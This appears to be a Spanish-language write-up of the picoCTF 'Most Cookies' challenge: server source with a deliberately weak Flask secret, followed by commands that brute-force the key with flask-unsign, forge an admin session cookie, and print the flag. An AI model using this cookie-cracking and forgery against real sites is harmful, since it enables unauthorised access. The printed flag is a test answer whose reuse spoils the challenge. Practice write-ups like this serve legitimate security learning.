Alright, enough of using my own encryption. Flask session cookies should be plenty secure! server.py http://mercury.picoctf.net:52134/

- How secure is a flask cookie?

## Solucion

```python
from flask import Flask, render_template, request, url_for, redirect, make_response, flash, session
import random
app = Flask(__name__)
flag_value = open("./flag").read().rstrip()
title = "Most Cookies"
cookie_names = ["snickerdoodle", "chocolate chip", "oatmeal raisin", "gingersnap", "shortbread", "peanut butter", "whoopie pie", "sugar", "molasses", "kiss", "biscotti", "butter", "spritz", "snowball", "drop", "thumbprint", "pinwheel", "wafer", "macaroon", "fortune", "crinkle", "icebox", "gingerbread", "tassie", "lebkuchen", "macaron", "black and white", "white chocolate macadamia"]
app.secret_key = random.choice(cookie_names)

@app.route("/")
def main():
	if session.get("very_auth"):
		check = session["very_auth"]
		if check == "blank":
			return render_template("index.html", title=title)
		else:
			return make_response(redirect("/display"))
	else:
		resp = make_response(redirect("/"))
		session["very_auth"] = "blank"
		return resp

@app.route("/search", methods=["GET", "POST"])
def search():
	if "name" in request.form and request.form["name"] in cookie_names:
		resp = make_response(redirect("/display"))
		session["very_auth"] = request.form["name"]
		return resp
	else:
		message = "That doesn't appear to be a valid cookie."
		category = "danger"
		flash(message, category)
		resp = make_response(redirect("/"))
		session["very_auth"] = "blank"
		return resp

@app.route("/reset")
def reset():
	resp = make_response(redirect("/"))
	session.pop("very_auth", None)
	return resp

@app.route("/display", methods=["GET"])
def flag():
	if session.get("very_auth"):
		check = session["very_auth"]
		if check == "admin":
			resp = make_response(render_template("flag.html", value=flag_value, title=title))
			return resp
		flash("That is a cookie! Not very special though...", "success")
		return render_template("not-flag.html", title=title, cookie_name=session["very_auth"])
	else:
		resp = make_response(redirect("/"))
		session["very_auth"] = "blank"
		return resp

if __name__ == "__main__":
	app.run()


```

### Crackeo de la cookie

google> crack fkask cookie kali>  https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/flask

- tomamos el header de la cookie y lo de codificamos
```
echo "eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0" | base64 -d
{"very_auth":"snickerdoodle"}base64: invalid input

```

- buscamos en el server.py y nos damos cuenta que debe ser 'admin' para ver la bandera,, pero falla
```
echo "eyJ2ZXJ5X2F1dGgiOiJibGFuayJ9" | base64 -d           
{"very_auth":"blank"}   
```

### Intentamos instalar flask-unsign

```
sudo apt install flask-unsign
python3 -m pip install flask-unsign
sudo apt install python3-flask-unsign
```



- Creamos un ambiente virtual para instalar flask-unsign
```
sudo apt install python3-venv
mkdir ~/.venv
python3 -m venv ~/.venv
source ~/.venv/bin/activate
python3 -m pip install flask-unsign

```
- creamos una lista de palabras con las cookies en el server.py
- en leafpad hay que decirle al replazar que es una expresion regular>. ", " por \n
```
"snickerdoodle", "chocolate chip", "oatmeal raisin", "gingersnap", "shortbread", "peanut butter", "whoopie pie", "sugar", "molasses", "kiss", "biscotti", "butter", "spritz", "snowball", "drop", "thumbprint", "pinwheel", "wafer", "macaroon", "fortune", "crinkle", "icebox", "gingerbread", "tassie", "lebkuchen", "macaron", "black and white", "white chocolate macadamia"
```


```

flask-unsign --unsign --cookie "eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.ZvjnRw.Q5G5QHhKYq9xFoso9FdKux2onHE" --wordlist cookies.txt 

[*] Session decodes to: {'very_auth': 'snickerdoodle'}
[*] Starting brute-forcer with 8 threads..
[+] Found secret key after 28 attemptscadamia
'peanut butter'


flask-unsign --sign --cookie "{'very_auth': 'admin'}" --secret "peanut butter"

eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.ZvjmyA.rOSGr63LbcfgXKNLDFyr0jyaxNI




 curl -s http://mercury.picoctf.net:52134/display -H "Cookie: session= eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.ZvjkTA.pELtbtVsYtnu8Vwz4vbwJjpQIBw" |  grep -oE "picoCTF{.*?}"
            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{pwn_4ll_th3_cook1E5_478da04c}</code></p>





```

# la opcion mas facil

```
sudo apt install pipx
pipx ensurepath
pipx install flask-unsign

```